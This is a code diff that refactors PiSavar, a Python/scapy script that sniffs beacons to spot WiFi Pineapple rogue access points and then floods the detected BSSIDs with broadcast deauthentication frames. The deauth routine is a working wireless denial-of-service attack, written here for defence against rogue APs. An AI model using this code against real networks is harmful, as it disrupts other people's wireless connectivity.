@@ -1,10 +1,12 @@
 # coding=utf-8
+import sys
+import argparse
 from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon
 from scapy.sendrecv import sendp
 from scapy.all import *
 from time import gmtime, strftime
 from termcolor import colored
-import sys
+
 
 banner_intro = """
 -----------------------------------------------------
@@ -34,13 +36,21 @@ banner_dos = """
          Sents deauthentication attack to TARGET(s)
 """
 
+DESCRIPTION = """
+The goal of this project is to find out the fake access points opened by the WiFi pineapple device using 
+the PineAP module and to prevent clients from being affected by initiating a deauthentication attack to 
+the attacking device.
+"""
+
+parser = argparse.ArgumentParser('PiSavar', description=DESCRIPTION)
+parser.add_argument('-i', '--interface', type=str, required=True, help="Interface")
+args = parser.parse_args()
+
 
 def sniff_channel_hop(iface):
-   for i in range(1,14):
-      os.system("iwconfig " + iface + " channel " + str(i))
-      sniff(iface=iface, count=3, prn=air_scan)
-
-   return
+    for i in range(1, 14):
+        os.system("iwconfig " + iface + " channel " + str(i))
+        sniff(iface=iface, count=3, prn=air_scan)
 
 
 def air_scan(pkt):
@@ -50,19 +60,18 @@ def air_scan(pkt):
     :param pkt:  result of sniff function
     """
     if pkt.haslayer(Dot11Beacon):
-        ssid  = pkt.info
-        bssid = pkt.addr2
-        info = bssid+ "==" +ssid
+        ssid, bssid = pkt.info, pkt.addr2
+        info = "{}=={}".format(bssid, ssid)
         if info not in info_list:
             info_list.append(info)
+
 
 def pp_analysis(info_list, pp):
     """
     Analysis air_scan result for pineAP Suite detection
     """
     for i in info_list:
-        bssid = i.split("==")[0]
-        ssid  = i.split("==")[1]
+        bssid, ssid = i.split("==")
         if bssid not in pp.keys():
             pp[bssid] = []
             pp[bssid].append(ssid)
@@ -81,11 +90,13 @@ def pp_analysis(info_list, pp):
     time.sleep(3)
     return blacklist
 
+
 def find_channel(clist, v):
-   for i in range(0, len(clist)):
-      if clist[i].haslayer(Dot11Beacon) and clist[i].addr2 == v:
-         channel = ord(clist[i][Dot11Elt:3].info)
-   return channel
+    for i in range(0, len(clist)):
+        if clist[i].haslayer(Dot11Beacon) and clist[i].addr2 == v:
+            channel = ord(clist[i][Dot11Elt:3].info)
+    return channel
+
 
 def pp_deauth(blacklist):
     """
@@ -103,24 +114,26 @@ def pp_deauth(blacklist):
     for d in blacklist:
         clist = sniff(iface=iface, count=30)
         channel = find_channel(clist, d)
-        os.system("iwconfig wlan0mon channel "+str(channel))
+        os.system("iwconfig wlan0mon channel " + str(channel))
         print "\033[1m[*] Sending 120 deauthentication packets to ", d
-        deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=d.lower(), addr3=d.lower())/Dot11Deauth()
-        sendp(deauth, iface=iface, count=120, inter = .2, verbose=False)
+        deauth = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=d.lower(), addr3=d.lower()) / Dot11Deauth()
+        sendp(deauth, iface=iface, count=120, inter=.2, verbose=False)
         time.sleep(1)
     print "\033[1m[*] Attack completed"
     time.sleep(2)
+
+
 if __name__ == '__main__':
-    iface = sys.argv[1]
-    while 1:
+    iface = args.interface
+    while True:
         channel = 0
         blacklist = []
         info_list = []
         pp = {}
-	os.system("reset")
+        os.system("reset")
         sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=70))
         print "\033[1m" + banner_intro
-        print "\n\033[1m[--] Start time: ",strftime("%Y-%m-%d %H:%M:%S", gmtime())
+        print "\n\033[1m[--] Start time: ", strftime("%Y-%m-%d %H:%M:%S", gmtime())
         os.system("ifconfig " + iface + " down && iwconfig " + iface + " mode Monitor && ifconfig " + iface + " up")
         time.sleep(4)
         print "\033[1m[--] Started sniffing"
@@ -134,9 +147,9 @@ if __name__ == '__main__':
         print "\033[1m=====================================\n"
         blacklist = pp_analysis(info_list, pp)
         time.sleep(2)
-	if len(blacklist) > 0:
-           sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=19, cols=70))
-           pp_deauth(blacklist)
-	else:
-	   print "\033[1m# -- > NO TRACE FOUND :)\n"
-           time.sleep(4)
+        if len(blacklist):
+            sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=19, cols=70))
+            pp_deauth(blacklist)
+        else:
+            print "\033[1m# -- > NO TRACE FOUND :)\n"
+            time.sleep(4)
